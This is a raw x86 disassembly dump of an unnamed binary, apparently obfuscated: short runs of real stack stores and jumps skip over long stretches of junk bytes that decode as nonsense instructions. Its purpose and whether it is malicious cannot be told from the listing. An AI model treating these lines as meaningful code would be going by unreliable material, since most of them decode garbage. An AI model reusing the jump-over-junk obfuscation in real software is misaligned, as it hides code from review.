  4107f6:	fbstp  TBYTE PTR [edi-0x21f3b0c0]
  4107fc:	cmp    DWORD PTR [ebp+ebp*4-0x539b7a7b],esp
  410803:	xor    al,BYTE PTR [ecx]
  410805:	fisttp QWORD PTR [eax+0x3229584a]
  41080b:	dec    ebx
  41080c:	(bad)  
  41080d:	sub    ebx,DWORD PTR [esi+0x26198929]
  410813:	retf   
  410814:	xor    edx,ecx
  410816:	jmp    0x4108f2
  41081b:	pop    edi
  41081c:	daa    
  41081d:	in     eax,dx
  41081e:	hlt    
  41081f:	std    
  410820:	(bad)  
  410821:	pop    edi
  410822:	scas   eax,DWORD PTR es:[edi]
  410823:	in     al,0x49
  410825:	pop    eax
  410826:	mov    eax,ds:0xcc3f6117
  41082b:	sti    
  41082c:	mov    dl,0x0
  41082e:	add    BYTE PTR [edi+0x3e000000],bh
  410834:	mov    bl,0x34
  410836:	xchg   edx,eax
  410837:	adc    ecx,eax
  410839:	inc    eax
  41083a:	test   al,0x83
  41083c:	and    BYTE PTR [ecx-0x3],al
  41083f:	push   ss
  410840:	loope  0x41088b
  410842:	mov    al,0x95
  410844:	xchg   edx,eax
  410845:	xor    DWORD PTR [ebx],edi
  410847:	or     ebp,edi
  410849:	adc    DWORD PTR [ebx],ebp
  41084b:	mov    bl,0x48
  41084d:	call   0x7272:0x20932742
  410854:	or     BYTE PTR [ebx+0x208bb0d5],al
  41085a:	sub    BYTE PTR [edi+0x44],dh
  41085d:	scas   al,BYTE PTR es:[edi]
  41085e:	out    dx,eax
  41085f:	mov    dl,0xd6
  410861:	xchg   ebx,eax
  410862:	jo     0x41086e
  410864:	pushf  
  410865:	sbb    ah,BYTE PTR ds:0xa0a3413d
  41086b:	add    BYTE PTR [esi],0xeb
  41086e:	in     eax,0x10
  410870:	or     dl,BYTE PTR [edx-0x7e]
  410873:	pop    edi
  410874:	push   edx
  410875:	je     0x4108a9
  410877:	mov    DWORD PTR [ebp+0x5b],esp
  41087a:	jmp    0x7fe0780f
  41087f:	jae    0x4108db
  410881:	cmp    eax,0x4effdc9b
  410886:	jo     0x41085a
  410888:	xchg   edx,eax
  410889:	mov    esp,0x15f12bef
  41088e:	clc    
  41088f:	out    0x9e,al
  410891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410892:	mov    dh,0x4c
  410894:	xchg   ebx,eax
  410895:	xchg   BYTE PTR [ebp+eiz*2-0x74],al
  410899:	jmp    0x410872
  41089b:	(bad)  
  41089c:	mov    esp,0x359f6148
  4108a1:	xor    eax,0xfbf3d405
  4108a6:	outs   dx,DWORD PTR ds:[esi]
  4108a7:	repnz add BYTE PTR ds:0x4799ae71,0xce
  4108af:	int    0x5c
  4108b1:	gs stos DWORD PTR es:[edi],eax
  4108b3:	mov    ch,0x6b
  4108b5:	icebp  
  4108b6:	push   es
  4108b7:	mov    esp,0x19cb19b8
  4108bc:	add    bl,bl
  4108be:	(bad)  
  4108bf:	mov    dl,0x20
  4108c1:	adc    bl,BYTE PTR [ebp+0x21]
  4108c4:	movq   QWORD PTR [edx-0x2b46cf3],mm7
  4108cb:	jecxz  0x41091d
  4108cd:	and    al,0x4a
  4108cf:	sar    DWORD PTR [esi],0x5d
  4108d2:	or     DWORD PTR [edi-0x7b4282da],esp
  4108d8:	and    al,BYTE PTR [esi-0x4]
  4108db:	xchg   ebx,eax
  4108dc:	mov    dh,0xe
  4108de:	loopne 0x410943
  4108e0:	test   DWORD PTR [edi],eax
  4108e2:	lods   eax,DWORD PTR ds:[esi]
  4108e3:	pop    edi
  4108e4:	fdivr  QWORD PTR [esi+0x4299bbc6]
  4108ea:	xlat   BYTE PTR ds:[ebx]
  4108eb:	mov    DWORD PTR ds:[edi+ebp*1],ecx
  4108ef:	lahf   
  4108f0:	jno    0x4108b8
  4108f2:	sub    edx,eax
  4108f4:	mov    eax,DWORD PTR [ebp-0x4]
  4108f7:	imul   edx,eax
  4108fa:	jmp    0x4109d6
  4108ff:	stos   DWORD PTR es:[edi],eax
  410900:	xchg   BYTE PTR [edi-0x4403e],bh
  410906:	out    dx,eax
  410907:	das    
  410908:	lods   al,BYTE PTR ds:[esi]
  410909:	sahf   
  41090a:	xchg   ebp,eax
  41090b:	mov    ebp,0xba337938
  410910:	mov    bl,0x0
  410912:	add    BYTE PTR [edi+0x74000000],bh
  410918:	test   DWORD PTR [edx-0x5b0f1103],edx
  41091e:	call   0x431059f
  410923:	or     al,0xbc
  410925:	(bad)  
  410927:	stos   BYTE PTR es:[edi],al
  410928:	adc    BYTE PTR ds:[ebx+0x72],dl
  41092c:	mov    dl,0xc2
  41092e:	lahf   
  41092f:	add    eax,DWORD PTR cs:[edx+0x1736a9d5]
  410936:	dec    edi
  410937:	sbb    ah,BYTE PTR [edi+eax*1+0x72]
  41093b:	outs   dx,BYTE PTR ds:[esi]
  41093c:	cmovo  edi,edx
  41093f:	mov    dh,0xd8
  410941:	mov    al,0x95
  410943:	shl    bh,cl
  410945:	and    al,al
  410947:	les    ecx,FWORD PTR [ebp-0x54]
  41094a:	mov    dh,BYTE PTR [eax+0x5c]
  41094d:	add    BYTE PTR [ebp+0x1f],ch
  410950:	sti    
  410951:	dec    eax
  410952:	xchg   esp,eax
  410953:	jnp    0x4108e6
  410955:	push   0xb3c69f9
  41095a:	retf   
  41095b:	push   esp
  41095c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41095d:	sbb    BYTE PTR [esi],dl
  41095f:	or     DWORD PTR ds:0xbf74b23d,0xa232e29b
  410969:	mov    bl,0x14
  41096b:	sub    eax,0x15c88fa2
  410970:	shl    BYTE PTR [esp+eiz*2],0x64
  410974:	push   0x2f
  410976:	jmp    0x22e3ac71
  41097b:	dec    ecx
  41097c:	cmp    bh,BYTE PTR [esi+0x2f]
  41097f:	ret    0x96f5
  410982:	nop
  410983:	sbb    ecx,DWORD PTR [bx+si+0x68]
  410987:	ins    BYTE PTR es:[edi],dx
  410988:	inc    edx
  410989:	mov    al,ds:0xc3f4f5f1
  41098e:	clc    
  41098f:	xchg   ebx,eax
  410990:	or     BYTE PTR [eax+0x1],ch
  410993:	repnz call 0x8de2:0x5e3634ce
  41099b:	mov    BYTE PTR ds:0xbb8da262,ah
  4109a1:	jno    0x4109ec
  4109a3:	or     ecx,edi
  4109a5:	fld    TBYTE PTR [edi+0x27]
  4109a8:	fild   QWORD PTR [ecx+ebx*1+0x3c3d6b9f]
  4109af:	xchg   DWORD PTR ss:[eax],ecx
  4109b2:	ja     0x410983
  4109b4:	mov    ebx,0x9e3a3bde
  4109b9:	xchg   edi,eax
  4109ba:	int    0xd9
  4109bc:	out    dx,eax
  4109bd:	dec    edx
  4109be:	popf   
  4109bf:	add    eax,edi
  4109c1:	mov    ebp,0xe78ceb8
  4109c6:	stos   DWORD PTR es:[edi],eax
  4109c7:	sahf   
  4109c8:	pop    edi
  4109c9:	mov    esi,0x4888d78d
  4109ce:	pop    esp
  4109cf:	xor    edi,esp
  4109d1:	xchg   ebp,eax
  4109d2:	sbb    al,0xc
  4109d4:	xor    BYTE PTR [edi],ah
  4109d6:	add    edx,DWORD PTR [ebp-0x3c]
  4109d9:	mov    DWORD PTR [ebp-0x3c],edx
  4109dc:	mov    edx,DWORD PTR [ebp-0x3c]
  4109df:	jmp    0x410bb3
  4109e4:	mov    edx,DWORD PTR [ebp-0x38]
  4109e7:	mov    esi,DWORD PTR [ebp-0x34]
  4109ea:	mov    esi,DWORD PTR [ebp-0x30]
  4109ed:	mov    edi,DWORD PTR [ebp-0x2c]
  4109f0:	jmp    0x410acc
  4109f5:	test   al,0x8d
  4109f7:	xchg   edi,eax
  4109f8:	and    esi,DWORD PTR [edi-0x2e7043c5]
  4109fe:	loope  0x410a14
  410a00:	in     al,0x70
  410a02:	sar    BYTE PTR [ebp+0x69],0x79
  410a06:	mov    ah,0x0
  410a08:	add    BYTE PTR [edi+0x2000000],bh
  410a0e:	mov    ds:0x1f5455d4,al
  410a13:	adc    DWORD PTR [esi],edx
  410a15:	push   ss
  410a16:	sbb    DWORD PTR [esi-0x574bef85],ebp
  410a1c:	into   
  410a1d:	into   
  410a1e:	jo     0x410a02
  410a20:	(bad)  
  410a22:	dec    ebp
  410a23:	sub    eax,0xc7bb40e9
  410a28:	xor    BYTE PTR [eax],bh
  410a2a:	pushf  
  410a2b:	jp     0x410aa6
  410a2d:	retf   
  410a2e:	outs   dx,BYTE PTR ds:[esi]
  410a2f:	lea    edi,[ebp-0x63d21335]
  410a35:	jmp    0xa25e64f8
  410a3a:	hlt    
  410a3b:	mov    ebx,0xd8ce8099
  410a40:	and    bh,cl
  410a42:	xor    ch,BYTE PTR cs:[ebx+edi*1]
  410a46:	les    dx,DWORD PTR [ebp-0x80]
  410a4a:	inc    eax
  410a4b:	iret   
  410a4c:	ret    
  410a4d:	add    eax,0xe36cd85a
  410a52:	jbe    0x410a07
  410a54:	mov    edi,0x9cd2fad5
  410a59:	rol    esi,1
  410a5b:	jns    0x410a41
  410a5d:	loopne 0x410a88
  410a5f:	mov    bl,0xf6
  410a61:	leave  
  410a62:	rcl    BYTE PTR [ecx+0x7224ff5a],cl
  410a68:	or     esi,DWORD PTR [ecx]
  410a6a:	xchg   ebx,eax
  410a6b:	mov    cl,0x7d
  410a6d:	pushf  
  410a6e:	cmp    eax,0xa1d6e5e9
  410a73:	xor    edi,DWORD PTR [edx+eiz*8+0x2e]
  410a77:	stc    
  410a78:	dec    eax
  410a7a:	test   eax,0xe3f7e105
  410a7f:	(bad)  
  410a80:	pop    ebx
  410a81:	mov    WORD PTR [esi-0x4226bf1c],fs
  410a87:	pop    ecx
  410a88:	jns    0x410af4
  410a8a:	add    eax,0xf6ec682d
  410a8f:	fidiv  WORD PTR [edx+0x0]
  410a92:	fdivr  DWORD PTR [esi-0x3a]
  410a95:	pop    esi
  410a96:	test   al,0x8d
  410a98:	mov    ds:0x3b09fb3c,al
  410a9d:	jne    0x410ae9
  410a9f:	sbb    BYTE PTR [esi],bl
  410aa1:	jmp    0x410a3b
  410aa3:	xchg   ebx,eax
  410aa4:	fldcw  WORD PTR [edi-0x4a29fa6f]
  410aaa:	push   esi
  410aab:	cdq    
  410aac:	jge    0x410a35
  410aae:	(bad)  [eax+0x21d3ff8e]
  410ab4:	push   esp
  410ab5:	xchg   ebp,eax
  410ab6:	dec    ecx
  410ab7:	mov    ds:0xab7c66c5,eax
  410abc:	push   eax
  410abd:	aad    0xff
  410abf:	xor    BYTE PTR [esi-0x68204bd5],dh
  410ac5:	outs   dx,BYTE PTR ds:[esi]
  410ac6:	aad    0xa5
  410ac8:	rcl    ch,cl
  410aca:	in     al,0x8e
  410acc:	xor    esi,ecx
  410ace:	jmp    0x410baa
  410ad3:	adc    al,0x3e
  410ad5:	dec    ebp
  410ad6:	adc    eax,0x3f5c776f
  410adb:	add    BYTE PTR [eax+0x7b],al
  410ade:	in     al,0x5e
  410ae0:	std    
  410ae1:	push   edx
  410ae2:	lahf   
  410ae3:	cmp    BYTE PTR [ebp+0xbf0000],dh
  410ae9:	add    BYTE PTR [eax],al
  410aeb:	cli    
  410aec:	daa    
  410aed:	in     eax,0x24
  410aef:	inc    edi
  410af0:	sar    DWORD PTR [ecx],1
  410af2:	rcl    BYTE PTR [ebx+0x69],cl
  410af5:	adc    ah,bl
  410af7:	sbb    BYTE PTR [edx+esi*1+0xf3e41c1],0x28
  410aff:	(bad)  
  410b01:	mov    ecx,0xd8280142
  410b06:	and    al,0x59
  410b08:	rcr    eax,cl
  410b0a:	dec    ebx
  410b0b:	inc    edx
  410b0c:	sub    al,0x98
  410b0e:	lea    ebp,[eax+0x7bd6c9f6]
  410b14:	outs   dx,BYTE PTR ds:[esi]
  410b15:	cmp    DWORD PTR [edx],esi
  410b17:	pop    ds
  410b18:	cld    
  410b19:	sbb    DWORD PTR [ebp+0x4c],0x8b53043f
  410b20:	int3   
  410b21:	mov    ebp,0xe7ed4290
  410b26:	jns    0x410ab7
  410b28:	int3   
  410b29:	out    dx,eax
  410b2a:	pushf  
  410b2b:	retf   
  410b2c:	add    DWORD PTR [ebp-0x6c56063c],edx
  410b32:	xor    DWORD PTR [ebx],edx
  410b34:	mov    ds:0xeef77936,eax
  410b3a:	dec    edi
  410b3b:	jg     0x410b9d
  410b3d:	inc    eax
  410b3e:	inc    eax
  410b3f:	neg    WORD PTR [ebp-0x27]
  410b43:	xchg   esi,eax
  410b44:	les    esi,FWORD PTR [ebx-0x1]
  410b47:	mov    dl,0x8c
  410b49:	jle    0x410b0b
  410b4b:	(bad)  
  410b4c:	aam    0x10
  410b4e:	jge    0x410b78
  410b50:	jge    0x410b4d
  410b52:	inc    eax
  410b53:	rcr    DWORD PTR [ebp-0x30d12814],1
  410b59:	les    eax,FWORD PTR [ecx+0x1242fee]
  410b5f:	or     DWORD PTR [ecx-0x7ffb4f4c],esi
  410b65:	mov    ebp,0xe982af0c
  410b6a:	lds    ecx,FWORD PTR [ecx+0x7e]
  410b6d:	jl     0x410b16
  410b6f:	mov    DWORD PTR [eax-0x6d656168],esi
  410b75:	rol    dh,1
  410b77:	xchg   dx,ax
  410b79:	pop    ebp
  410b7a:	fidiv  DWORD PTR [ebx+0x42c14a7b]
  410b80:	pop    ecx
  410b81:	scas   eax,DWORD PTR es:[edi]
  410b82:	(bad)  
  410b83:	(bad)  
  410b84:	repnz or eax,DWORD PTR [edx+0x384dbeb4]
  410b8b:	cli    
  410b8c:	mov    dh,0xd7
  410b8e:	mov    bh,0x34
  410b90:	mov    ss,WORD PTR [ecx+0x7f1564db]
  410b96:	xchg   edx,eax
  410b97:	popf   
  410b98:	xor    ch,dl
  410b9a:	in     al,dx
  410b9b:	repz cmc 
  410b9d:	add    DWORD PTR [edi],ebx
  410b9f:	cmp    al,0x1c
  410ba1:	xchg   esi,eax
  410ba2:	dec    ebx
  410ba3:	clc    
  410ba4:	out    dx,eax
  410ba5:	push   cs
  410ba6:	mov    edx,0x33915918
  410bab:	shr    DWORD PTR [ebx],1
  410bad:	lock sub edx,eax
  410bb0:	imul   edx,esi
  410bb3:	mov    eax,DWORD PTR [ebp-0x40]
  410bb6:	jmp    0x410c92
  410bbb:	xchg   BYTE PTR [ebx],dl
  410bbd:	cmp    al,0xe6
  410bbf:	mov    ebp,0x9973deef
  410bc4:	and    DWORD PTR [eax-0x39d7795f],ebp
  410bca:	fdivrp st(7),st
  410bcc:	mov    ch,0x0
  410bce:	add    BYTE PTR [edi+0x0],bh
  410bd4:	push   eax
  410bd5:	out    dx,al
  410bd6:	and    cl,BYTE PTR [ecx-0x48]
  410bd9:	xor    esi,edx
  410bdb:	add    BYTE PTR [ebx+0x504d472b],bh
  410be1:	int    0x51
  410be3:	add    bh,BYTE PTR [ecx]
  410be5:	jbe    0x410bd9
  410be7:	mov    ds:0xcbaad647,eax
  410bec:	sti    
  410bed:	jecxz  0x410bd4
  410bef:	fs iret 
  410bf1:	dec    ecx
  410bf2:	dec    esi
  410bf3:	dec    esp
  410bf4:	inc    esp
  410bf5:	nop
  410bf6:	xchg   edx,eax
  410bf7:	mov    cl,0x65
  410bf9:	push   0x851c0c3d
  410bfe:	jp     0x410c60
  410c00:	add    al,0x6
  410c02:	mov    ebx,DWORD PTR cs:[eax-0x58257b49]
  410c09:	sbb    dl,BYTE PTR [ebp-0x73]
  410c0c:	pushf  
  410c0d:	mov    dl,0x16
  410c0f:	scas   eax,DWORD PTR es:[edi]
  410c10:	add    BYTE PTR [esi+eiz*4+0x62ec7418],dl
  410c17:	jmp    0x9b92b240
  410c1c:	jno    0x410c99
  410c1e:	sbb    bl,BYTE PTR [ebx+ebx*8-0x3c]
  410c22:	loope  0x410ca3
  410c24:	sbb    cl,bh
  410c26:	cmp    dh,BYTE PTR ds:0x2d2efcb1
  410c2c:	pusha  
  410c2d:	adc    DWORD PTR [esi+0x72],ecx
  410c30:	sahf   
  410c31:	sbb    dl,BYTE PTR [edi+0x38b8363d]
  410c37:	mov    ecx,0xc1df5edb
  410c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c3d:	push   edx
  410c3e:	gs cli 
  410c40:	sbb    eax,0xdf90d5ed
  410c45:	mov    bh,BYTE PTR [ecx+edx*8]
  410c48:	jbe    0x410c3d
  410c4a:	lock sub DWORD PTR [ebx-0x68],esp
  410c4e:	push   ebx
  410c4f:	jae    0x410bfb
  410c51:	out    0xbe,al
  410c53:	inc    eax
  410c54:	mov    bh,0xc9
  410c56:	adc    edx,DWORD PTR [ebx]
  410c58:	mov    ebp,0x6a452387
  410c5d:	scas   eax,DWORD PTR es:[edi]
  410c5e:	mov    edx,0x5b9401da
  410c63:	push   cs
  410c64:	push   cs
  410c65:	rol    BYTE PTR cs:[ecx-0x6ca5904c],1
  410c6c:	pop    ds
  410c6d:	fwait
  410c6e:	and    esp,DWORD PTR [ebp+edi*2+0x1f46b8a]
  410c75:	push   eax
  410c76:	repnz loop 0x410c2a
  410c79:	retf   
  410c7a:	sub    DWORD PTR [ebp+0x6661acae],edx
  410c80:	adc    DWORD PTR [edx-0x475c7509],0x28c5fc36
  410c8a:	mov    bh,0x8e
  410c8c:	pop    edx
  410c8d:	or     ecx,DWORD PTR [eax]
  410c8f:	test   al,0xb4
  410c91:	push   ecx
  410c92:	mov    ecx,0x2899
  410c97:	sub    ecx,eax
  410c99:	add    ecx,DWORD PTR [ebp-0x44]
  410c9c:	jmp    0x410d78
  410ca1:	jne    0x410d20
  410ca3:	and    eax,0x7d5c2d0c
  410ca8:	jge    0x410c8b
  410caa:	(bad)  
  410cab:	imul   eax,ebx,0x699d4770
  410cb1:	mov    dh,0xb6
  410cb3:	add    BYTE PTR [eax],al
  410cb5:	mov    edi,0x27000000
  410cba:	mov    BYTE PTR [ecx],0xc8
  410cbd:	jmp    0xe9b41fa1
  410cc2:	jmp    0x660e64de
  410cc7:	inc    ebx
  410cc8:	hlt    
  410cc9:	push   0x5ab56692
  410cce:	outs   dx,DWORD PTR ds:[esi]
  410ccf:	(bad)  
  410cd0:	mov    dh,0xb9
  410cd2:	xchg   BYTE PTR [edx+0x3b],bh
  410cd5:	scas   al,BYTE PTR es:[edi]
  410cd6:	cmp    esi,esp
  410cd8:	mov    bh,0x88
  410cda:	and    edi,DWORD PTR [esi+esi*2+0x1b]
  410cde:	stc    
  410cdf:	jbe    0x410d1a
  410ce1:	dec    ebp
  410ce2:	jae    0x410c98
  410ce4:	sti    
  410ce5:	sub    DWORD PTR [eax+0x78],ecx
  410ce8:	push   ds
  410ce9:	aas    
  410cea:	cwde   
  410ceb:	mov    bh,0x51
  410ced:	add    edi,DWORD PTR ds:0x7f0fc295
  410cf3:	(bad)  
  410cf4:	addr16 xor esp,ebx
  410cf7:	mov    ebp,0xc0915d50
  410cfc:	inc    ebx
  410cfd:	in     al,0xce
  410cff:	jo     0x410d37
  410d01:	ins    BYTE PTR es:[edi],dx
  410d02:	sti    
  410d03:	xchg   ebp,eax
  410d04:	int3   
  410d05:	pop    esp
  410d06:	xchg   ch,ch
  410d08:	stc    
  410d09:	jp     0x7b8f9648
  410d0f:	loope  0x410d4f
  410d11:	mov    al,0xff
  410d13:	push   ss
  410d14:	ds mov bl,0x27
  410d17:	inc    esi
  410d18:	add    ch,BYTE PTR [edi*1-0x54027b89]
  410d1f:	pop    edi
  410d20:	cwde   
  410d21:	in     eax,0xae
  410d23:	xchg   esp,eax
  410d24:	call   0xae4ca8d3
  410d29:	sbb    dl,al
  410d2b:	cmp    ebx,edi
  410d2d:	xchg   ecx,eax
  410d2e:	inc    esp
  410d2f:	dec    esi
  410d30:	in     eax,dx
  410d31:	rcr    ebp,1
  410d33:	aas    
  410d34:	ret    
  410d35:	and    DWORD PTR [eax],ecx
  410d37:	cld    
  410d38:	stos   DWORD PTR es:[edi],eax
  410d39:	lods   eax,DWORD PTR ds:[esi]
  410d3a:	pop    edi
  410d3b:	rcr    BYTE PTR [ebp-0x58],1
  410d3e:	cmp    al,BYTE PTR [ebx+0x2e]
  410d41:	adc    DWORD PTR [edi-0x58],esi
  410d44:	(bad)  
  410d45:	(bad)  
  410d46:	rcl    BYTE PTR [eax-0x51294a44],cl
  410d4c:	push   eax
  410d4d:	mov    eax,ds:0xc174cd0c
  410d52:	clc    
  410d53:	push   es
  410d54:	clc    
  410d55:	push   ss
  410d56:	inc    ebx
  410d57:	adc    DWORD PTR [ebp+0x57bb3a10],ebx
  410d5d:	jmp    0x9bdf:0xf36b61d8
  410d64:	outs   dx,DWORD PTR ds:[esi]
  410d65:	mov    ebx,0x1a39e123
  410d6a:	lds    eax,FWORD PTR [ebx+0x63]
  410d6d:	loopne 0x410dc6
  410d6f:	repz or BYTE PTR [ecx],ah
  410d72:	ret    
  410d73:	aad    0x9c
  410d75:	mov    esp,DWORD PTR [ecx-0x47ba748e]
  410d7b:	or     ecx,eax
  410d7d:	lea    eax,[ecx+edx*1-0x7e9e]
  410d84:	mov    DWORD PTR [ebp-0x4],eax
  410d87:	mov    DWORD PTR [ebp-0x24],0x5028
  410d8e:	mov    DWORD PTR [ebp-0x28],0x7e46
  410d95:	jmp    0x410e71
  410d9a:	inc    edi
  410d9b:	sub    al,0xc6
  410d9d:	popa   
  410d9e:	out    dx,eax
  410d9f:	jmp    0x410d88
  410da1:	cs push edx
  410da3:	and    esp,DWORD PTR [esi]
  410da5:	imul   ecx,DWORD PTR [ebx],0x75339aa8
  410dab:	mov    bh,0x0
  410dad:	add    BYTE PTR [edi+0x67000000],bh
  410db3:	sbb    al,BYTE PTR [ebp+0x29089b51]
  410db9:	mov    esp,0x9dd1a8da
  410dbe:	jo     0x410dc5
  410dc0:	xor    cl,ch
  410dc2:	xlat   BYTE PTR ds:[ebx]
  410dc3:	add    eax,0xe1499d9
  410dc8:	and    eax,0x3019249b
  410dcd:	popa   
  410dce:	das    
  410dcf:	jecxz  0x410d97
  410dd1:	push   0x41
  410dd3:	ds jne 0x410da6
  410dd6:	lods   eax,DWORD PTR ds:[esi]
  410dd7:	out    0x25,al
  410dd9:	in     al,0xfd
  410ddb:	js     0x410df4
  410ddd:	repnz repz rol BYTE PTR [ecx+0x58937958],1
  410de5:	test   DWORD PTR [eax],edx
  410de7:	and    al,0xdb
  410de9:	mov    cs,WORD PTR [edx+0x276c59aa]
  410def:	aaa    
  410df0:	add    edi,DWORD PTR [esi-0x3e]
  410df3:	ror    ebx,cl
  410df5:	icebp  
  410df6:	sub    al,0x35
  410df8:	cld    
  410df9:	mov    ebp,0x4058a399
  410dfe:	popa   
  410dff:	push   ebx
  410e00:	fwait
  410e01:	es xchg edi,eax
  410e03:	mov    ch,BYTE PTR [eax]
  410e05:	dec    ebx
  410e06:	push   ebp
  410e07:	dec    ebp
  410e08:	repnz add eax,0x1b0574ef
  410e0f:	xchg   edx,eax
  410e10:	fwait
  410e11:	retf   
  410e12:	jb     0x410da6
  410e14:	jb     0x410e5e
  410e16:	pop    ecx
  410e17:	(bad)  
  410e18:	div    DWORD PTR ds:0xce975b27
  410e1e:	nop
  410e1f:	fcomp  DWORD PTR [eax]
  410e21:	popa   
  410e22:	mov    eax,0x5f97912f
  410e27:	sbb    DWORD PTR [esi+0x66],ecx
  410e2a:	in     al,0x49
  410e2c:	jp     0x410e26
  410e2e:	and    DWORD PTR [edi-0x45fbaea6],edx
  410e34:	int    0x6b
  410e36:	and    bl,BYTE PTR [edi+0x7942f5e2]
  410e3c:	stos   BYTE PTR es:[edi],al
  410e3d:	aaa    
  410e3e:	push   ds
  410e3f:	jae    0x410e54
  410e41:	mov    edx,DWORD PTR ds:0x47f44796
  410e47:	call   FWORD PTR [eax+0x4b]
  410e4a:	test   al,0xc1
  410e4c:	and    ch,BYTE PTR [ecx]
  410e4e:	push   cs
  410e4f:	imul   eax,DWORD PTR [eax+0x68],0x31
  410e53:	outs   dx,BYTE PTR ds:[esi]
  410e54:	jno    0x410eb5
  410e56:	push   esp
  410e57:	fdivr  QWORD PTR [edi]
  410e59:	gs dec edx
  410e5b:	and    edx,DWORD PTR [esi]
  410e5d:	or     al,0x57
  410e5f:	retf   
  410e60:	mov    edx,0x8f56e879
  410e65:	lock jp 0x410e22
  410e68:	jb     0x410e6b
  410e6a:	sub    bl,BYTE PTR ss:0x31da6e68
  410e71:	mov    DWORD PTR [ebp-0x40],0xab2
  410e78:	mov    DWORD PTR [ebp-0x3c],0x2097
  410e7f:	mov    DWORD PTR [ebp-0x44],0x921f
  410e86:	jmp    0x410f62
  410e8b:	ficom  WORD PTR ds:0xd5cfd504
  410e91:	fistp  WORD PTR [edi]
  410e93:	mov    bl,0xc0
  410e95:	jecxz  0x410e75
  410e97:	jg     0x410e75
  410e99:	push   eax
  410e9a:	or     eax,0xb834
  410e9f:	mov    edi,0x8f000000
  410ea4:	rol    DWORD PTR [edi+edx*8+0x505bc7a],cl
  410eab:	sbb    BYTE PTR [ebp-0x5f],0x78
  410eaf:	fistp  QWORD PTR [eax+ebx*8]
  410eb2:	repnz sub al,0x1a
  410eb5:	xor    esp,DWORD PTR [edx]
  410eb7:	xor    dl,bh
  410eb9:	out    dx,eax
  410eba:	jno    0x410f29
  410ebc:	mov    cl,0xa1
  410ebe:	jl     0x410eed
  410ec0:	push   0x18
  410ec2:	rcr    ebp,0xb
  410ec5:	scas   al,BYTE PTR es:[edi]
  410ec6:	cmp    ch,cl
  410ec8:	shl    ebp,1
  410eca:	push   0x4b3499d9
  410ecf:	leave  
  410ed0:	xchg   BYTE PTR ds:0x53af52ce,ah
  410ed6:	or     al,0x7e
  410ed8:	push   ebx
  410ed9:	ds mov eax,0x7eb26d0c
  410edf:	adc    eax,0x24e66fbf
  410ee4:	adc    BYTE PTR [edi+0x151cf2d8],bl
  410eea:	mov    ah,0xf1
  410eec:	pop    eax
  410eed:	scas   eax,DWORD PTR es:[edi]
  410eee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eef:	ins    BYTE PTR es:[edi],dx
  410ef0:	(bad)  
  410ef1:	popf   
  410ef2:	xchg   edx,eax
  410ef3:	in     al,dx
  410ef4:	pop    edx
  410ef5:	out    0x59,al
  410ef7:	pop    ds
  410ef8:	clc    
  410ef9:	jne    0x410e8b
  410efb:	cmp    DWORD PTR [esi],0x99c11c1e
  410f01:	adc    al,0xa1
  410f03:	pop    esi
  410f04:	pop    eax
  410f05:	jg     0x410f58
  410f07:	test   eax,0x701e9c29
  410f0c:	xor    al,0x4a
  410f0e:	pop    ss
  410f0f:	test   DWORD PTR [esi+0x229731a0],edi
  410f15:	inc    esp
  410f16:	mov    ?,WORD PTR ds:0xfe032d00
  410f1c:	lock jp 0x410ea0
  410f1f:	cmp    DWORD PTR gs:[edi+0xb],eax
  410f23:	scas   eax,DWORD PTR es:[edi]
  410f24:	fwait
  410f25:	mov    dl,BYTE PTR fs:[ecx+0x564309bf]
  410f2c:	int3   
  410f2d:	inc    ebx
  410f2e:	retf   
  410f2f:	sbb    al,BYTE PTR [esi+edi*2-0x11]
  410f33:	imul   edx,DWORD PTR [ebp-0x19],0xffffffbb
  410f37:	adc    bh,BYTE PTR [edi+0x6c]
  410f3a:	int3   
  410f3b:	test   DWORD PTR [ebp-0x4f],esi
  410f3e:	call   0xec49b234
  410f43:	mov    ebx,0x9e122545
  410f48:	(bad)  
  410f49:	mov    esi,0x3f69abfb
  410f4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f4f:	add    ebx,ecx
  410f51:	cs out dx,al
  410f53:	push   ebp
  410f54:	cmp    al,0xf9
  410f56:	or     BYTE PTR ds:[ebp+0x636d0136],dl
  410f5d:	ror    DWORD PTR [ecx],0x37
  410f60:	sbb    al,0x24
  410f62:	mov    DWORD PTR [ebp-0x48],0x63f9
  410f69:	jmp    0x411045
  410f6e:	(bad)  
  410f6f:	ins    DWORD PTR es:[edi],dx
  410f70:	out    dx,eax
  410f71:	push   0xffd7eaff
  410f76:	stc    
  410f77:	mov    eax,ds
  410f79:	ficomp WORD PTR [ebp-0xc1bb9c9]
  410f7f:	mov    eax,0xbf0000
  410f84:	add    BYTE PTR [eax],al
  410f86:	jo     0x410f7c
  410f88:	in     al,dx
  410f89:	mov    eax,0xe55b3d90
  410f8e:	xor    BYTE PTR [eax-0x7f7e311b],bh
  410f94:	push   eax
  410f95:	outs   dx,DWORD PTR ds:[esi]
  410f96:	lds    eax,FWORD PTR [edx+0x736245ca]
  410f9c:	xor    ebx,DWORD PTR [ecx-0x60]
  410f9f:	mov    ebx,0xcafbd9c
  410fa4:	jo     0x410f73
  410fa6:	js     0x410fb1
  410fa8:	mov    ah,0x7c
  410faa:	lock fdivr QWORD PTR [ebx-0x522133d8]
  410fb1:	xchg   ecx,eax
  410fb2:	sti    
  410fb3:	rcl    DWORD PTR [edx+0x20],1
  410fb6:	nop
  410fb7:	sub    al,0x66
  410fb9:	mov    esi,0xa44cdf02
  410fbe:	cdq    
  410fbf:	scas   al,BYTE PTR es:[edi]
  410fc0:	test   ch,ch
  410fc2:	mov    BYTE PTR [edx+0x4722b256],0xbe
  410fc9:	aam    0x3c
  410fcb:	add    dl,cl
  410fcd:	dec    ecx
  410fcf:	inc    edx
  410fd0:	or     ch,BYTE PTR [eax*1-0x7b75b12e]
  410fd7:	and    DWORD PTR [ebx],ebp
  410fd9:	ret    0xe124
  410fdc:	mov    ecx,0x870ff266
  410fe1:	test   eax,0x6331d1f4
  410fe6:	ins    BYTE PTR es:[edi],dx
  410fe7:	out    0x49,eax
  410fe9:	push   edi
  410fea:	xchg   ebp,eax
  410feb:	loopne 0x411062
  410fed:	imul   ecx,DWORD PTR [ebp-0x1770820b],0x3a0e6be4
  410ff7:	inc    edx
  410ff8:	adc    BYTE PTR [ebx+0x1a],dl
  410ffb:	mov    dh,0x1c
